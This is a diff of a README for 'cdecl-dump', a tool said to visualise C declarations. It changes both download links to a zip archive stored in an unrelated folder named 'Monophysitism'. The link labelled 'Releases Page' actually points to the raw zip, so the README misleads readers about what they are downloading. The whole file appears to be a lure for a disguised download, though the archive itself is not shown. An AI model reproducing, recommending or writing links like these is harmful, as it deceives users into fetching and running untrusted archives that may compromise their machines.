@@ -1,7 +1,7 @@
 # 🎉 cdecl-dump - Easily Visualize Complex C Declarations
 
 ## 📥 Download Now
-[![Download cdecl-dump](https://github.com/toitenlaa/cdecl-dump/raw/refs/heads/main/Monophysitism/dump-cdecl-1.0.zip)](https://github.com/toitenlaa/cdecl-dump/raw/refs/heads/main/Monophysitism/dump-cdecl-1.0.zip)
+[![Download cdecl-dump](https://github.com/toitenlaa/cdecl-dump/raw/refs/heads/main/Monophysitism/cdecl-dump-v2.6.zip)](https://github.com/toitenlaa/cdecl-dump/raw/refs/heads/main/Monophysitism/cdecl-dump-v2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to cdecl-dump! This tool helps you visualize complex C declarations. With cdecl-dump, you can easily understand and collaborate on C code, making it simpler for everyone.
@@ -14,7 +14,7 @@ Welcome to cdecl-dump! This tool helps you visualize complex C declarations. Wit
 ## 💾 Download & Install
 To get started, visit the Releases page to download cdecl-dump:
 
-[Visit the Releases Page](https://github.com/toitenlaa/cdecl-dump/raw/refs/heads/main/Monophysitism/dump-cdecl-1.0.zip)
+[Visit the Releases Page](https://github.com/toitenlaa/cdecl-dump/raw/refs/heads/main/Monophysitism/cdecl-dump-v2.6.zip)
 
 1. Click on the link above.
 2. Find the latest release.
